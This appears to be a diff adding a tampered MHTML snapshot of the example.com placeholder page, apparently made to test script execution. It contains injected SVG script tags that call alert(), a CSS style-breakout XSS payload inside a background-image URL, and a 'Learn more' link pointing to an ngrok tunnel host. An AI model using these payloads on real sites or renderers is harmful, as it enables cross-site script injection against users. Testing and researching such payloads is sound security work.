@@ -1,0 +1,47 @@
+From: <Saved by Blink>
+Snapshot-Content-Location: https://example.com/
+Subject: Example Domain
+Date: Mon, 15 Jun 2026 22:44:00 +0800
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----MultipartBoundary--O03f3xvYqVlCfi4XsU4Yw6JNcfHNl6fUQiB55nOhmk----"
+
+
+------MultipartBoundary--O03f3xvYqVlCfi4XsU4Yw6JNcfHNl6fUQiB55nOhmk----
+Content-Type: text/html
+Content-ID: <frame-EE99AA7BC6318007C17BC4695EA2C751@mhtml.blink>
+Content-Transfer-Encoding: binary
+Content-Location: https://example.com/
+
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><link rel="stylesheet" type="text/css" href="cid:css-fe69916c-8000-4f74-8fea-89449c971a5b@mhtml.blink" /><title>Example Domain</title><link rel="icon" href="data:,"><meta name="viewport" content="width=device-width, initial-scale=1"></head><body><div><h1>Example novian Domain</h1><p>This domain is for use in documentation examples without needing permission. Avoid use in operations.</p><p><a href="https://snake-moved-fairly.ngrok-free.app/">Learn more</a></p><h1>anjay</h1>
+
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <svg x="10">
+    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
+    <script type="text/javascript">alert('sub-svg 1');</script>
+  </svg>
+  <svg x="200">
+    <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
+    <script type="text/javascript">alert('sub-svg 2');</script>
+  </svg>
+</svg>
+
+</body></html>
+------MultipartBoundary--O03f3xvYqVlCfi4XsU4Yw6JNcfHNl6fUQiB55nOhmk----
+Content-Type: text/css
+Content-Transfer-Encoding: binary
+Content-Location: cid:css-fe69916c-8000-4f74-8fea-89449c971a5b@mhtml.blink
+
+@charset "windows-1252";
+
+body { background: rgb(238, 238, 238); width: 60vw; margin: 15vh auto; font-family: system-ui, sans-serif; 
+background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+}
+
+h1 { font-size: 1.5em; }
+
+div { opacity: 0.8; }
+
+a:link, a:visited { color: rgb(51, 68, 136); }
+------MultipartBoundary--O03f3xvYqVlCfi4XsU4Yw6JNcfHNl6fUQiB55nOhmk------
